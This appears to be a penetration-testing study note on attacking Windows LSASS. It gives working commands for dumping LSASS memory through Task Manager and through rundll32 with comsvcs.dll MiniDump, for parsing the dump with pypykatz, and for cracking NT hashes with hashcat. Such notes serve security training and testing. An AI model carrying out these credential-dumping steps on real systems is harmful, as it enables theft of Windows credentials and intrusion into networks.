

# Attacking LSASS

[See Windows credentials storage](windows-credentials-storage.md).


## Dumping LSASS Process Memory

There are several methods to dump LSASS process memory.


### 1. Task manager method 

Open it. In Process tab, search for `Local Security Authority Process`. Click right on it and select `Create dump file`. A file called `lsass.DMP` is created and saved in:

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

Transfer file to attacking machine.


### Rundll32.exe & Comsvcs.dll method

Modern anti-virus tools recognize this method as malicious activity.

```powershell
# Finding LSASS PID in cmd
tasklist /svc

# Finding LSASS PID in PowerShell
Get-Process lsass

# Creating lsass.dmp using PowerShell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
# With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). 
```

Transfer file to attacking machine.


### 3. Pypykatz

pypykatz parses the secrets hidden in the LSASS process memory dump.

```bash
pypykatz lsa minidump /home/path/lsass.dmp 
```


## Crack the file

### Cracking the NT Hash with Hashcat

```shell-session
sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt
```